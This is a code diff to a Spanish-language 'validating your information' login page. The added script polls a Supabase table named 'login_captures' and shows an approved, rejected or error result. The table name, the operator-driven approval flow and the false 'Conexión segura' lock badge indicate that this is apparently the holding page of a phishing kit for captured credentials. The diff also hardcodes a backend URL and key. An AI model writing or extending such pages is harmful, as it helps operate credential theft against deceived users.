@@ -109,6 +109,30 @@
             margin-right: 4px;
             vertical-align: middle;
         }
+
+        /* Estados de resultado */
+        .result-container {
+            display: none;
+        }
+        .result-container.active {
+            display: block;
+        }
+        .result-container .icon-result {
+            font-size: 64px;
+            margin-bottom: 16px;
+        }
+        .result-container h2 {
+            font-size: 1.3rem;
+            margin-bottom: 8px;
+        }
+        .result-container p {
+            color: #4d5b70;
+            font-size: 0.95rem;
+            line-height: 1.5;
+        }
+        .result-approved h2 { color: #37a500; }
+        .result-rejected h2 { color: #e30425; }
+        .result-error h2 { color: #ff7800; }
     </style>
 </head>
 <body>
@@ -121,25 +145,166 @@
             </svg>
         </div>
 
-        <div class="spinner">
-            <div class="spinner-ring"></div>
-            <div class="spinner-ring"></div>
+        <!-- Spinner de carga -->
+        <div id="loadingSection">
+            <div class="spinner">
+                <div class="spinner-ring"></div>
+                <div class="spinner-ring"></div>
+            </div>
+            <h1>Validando información</h1>
+            <p class="message">
+                Estamos verificando tus datos<br>
+                para iniciar tu sesión
+                <span class="dots">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </span>
+            </p>
         </div>
 
-        <h1>Validando información</h1>
-        <p class="message">
-            Estamos verificando tus datos<br>
-            para iniciar tu sesión
-            <span class="dots">
-                <span></span>
-                <span></span>
-                <span></span>
-            </span>
-        </p>
+        <!-- Resultado: Aprobado -->
+        <div id="resultApproved" class="result-container result-approved">
+            <div class="icon-result">✅</div>
+            <h2>Sesión Aprobada</h2>
+            <p>Tu inicio de sesión ha sido verificado y aprobado correctamente.</p>
+        </div>
+
+        <!-- Resultado: Rechazado -->
+        <div id="resultRejected" class="result-container result-rejected">
+            <div class="icon-result">❌</div>
+            <h2>Sesión Rechazada</h2>
+            <p>Lo sentimos, tu inicio de sesión no pudo ser verificado. Intenta nuevamente.</p>
+        </div>
+
+        <!-- Resultado: Error -->
+        <div id="resultError" class="result-container result-error">
+            <div class="icon-result">⚠️</div>
+            <h2>Error de conexión</h2>
+            <p>No se pudo verificar el estado de tu sesión. Por favor, intenta de nuevo más tarde.</p>
+        </div>
 
         <p class="footer-text">
             <span class="lock-icon">🔒</span> Conexión segura
         </p>
     </div>
+
+    <script>
+        // ═══════════════════════════════════════════════════════════════
+        // CONFIGURACIÓN SUPABASE
+        // ═══════════════════════════════════════════════════════════════
+        const SUPABASE_URL = 'https://ktuknakuiicqdicknqnu.supabase.co';
+        const SUPABASE_ANON_KEY = 'sb_publishable_mIQcyGnaX_oatdbodvzJVQ_Szu_D0en';
+
+        // ═══════════════════════════════════════════════════════════════
+        // OBTENER ID DE LA SESIÓN DESDE LA URL
+        // ═══════════════════════════════════════════════════════════════
+        const urlParams = new URLSearchParams(window.location.search);
+        const sessionId = urlParams.get('id');
+
+        // ═══════════════════════════════════════════════════════════════
+        // MOSTRAR RESULTADO
+        // ═══════════════════════════════════════════════════════════════
+        function mostrarResultado(tipo) {
+            document.getElementById('loadingSection').style.display = 'none';
+            document.getElementById('resultApproved').classList.remove('active');
+            document.getElementById('resultRejected').classList.remove('active');
+            document.getElementById('resultError').classList.remove('active');
+
+            if (tipo === 'approved') {
+                document.getElementById('resultApproved').classList.add('active');
+            } else if (tipo === 'rejected') {
+                document.getElementById('resultRejected').classList.add('active');
+            } else {
+                document.getElementById('resultError').classList.add('active');
+            }
+        }
+
+        // ═══════════════════════════════════════════════════════════════
+        // CONSULTAR ESTADO DE LA SESIÓN
+        // ═══════════════════════════════════════════════════════════════
+        async function consultarEstado() {
+            if (!sessionId) {
+                console.error('No se encontró ID de sesión en la URL');
+                mostrarResultado('error');
+                return;
+            }
+
+            try {
+                const response = await fetch(`${SUPABASE_URL}/rest/v1/login_captures?id=eq.${sessionId}&select=status`, {
+                    headers: {
+                        'apikey': SUPABASE_ANON_KEY,
+                        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+                        'Content-Type': 'application/json'
+                    }
+                });
+
+                if (response.status === 404) {
+                    // La tabla no existe en Supabase
+                    console.error('La tabla login_captures no existe en Supabase');
+                    mostrarResultado('error');
+                    return true;
+                }
+
+                if (!response.ok) {
+                    // Si es 400, probablemente el ID no existe aún (se creará pronto)
+                    if (response.status === 400 || response.status === 406) {
+                        console.log('Sesión aún no disponible, reintentando...');
+                        return false; // Continuar polling
+                    }
+                    throw new Error(`Error HTTP: ${response.status}`);
+                }
+
+                const data = await response.json();
+
+                if (!data || data.length === 0) {
+                    console.log('Sesión no encontrada aún, reintentando...');
+                    return false; // Continuar polling en lugar de mostrar error
+                }
+
+                const estado = data[0].status || 'pendiente';
+
+                if (estado === 'approved') {
+                    mostrarResultado('approved');
+                    return true;
+                } else if (estado === 'rejected') {
+                    mostrarResultado('rejected');
+                    return true;
+                } else {
+                    // Sigue pendiente, continuar consultando
+                    return false;
+                }
+
+            } catch (error) {
+                console.error('Error al consultar estado:', error);
+                mostrarResultado('error');
+                return true; // Detener el polling si hay error
+            }
+        }
+
+        // ═══════════════════════════════════════════════════════════════
+        // INICIAR POLLING EN TIEMPO REAL
+        // ═══════════════════════════════════════════════════════════════
+        document.addEventListener('DOMContentLoaded', function() {
+            if (!sessionId) {
+                mostrarResultado('error');
+                return;
+            }
+
+            // Consultar inmediatamente
+            consultarEstado().then(function(finalizado) {
+                if (!finalizado) {
+                    // Si sigue pendiente, consultar cada 2 segundos
+                    var intervalo = setInterval(function() {
+                        consultarEstado().then(function(finalizado) {
+                            if (finalizado) {
+                                clearInterval(intervalo);
+                            }
+                        });
+                    }, 2000);
+                }
+            });
+        });
+    </script>
 </body>
 </html>
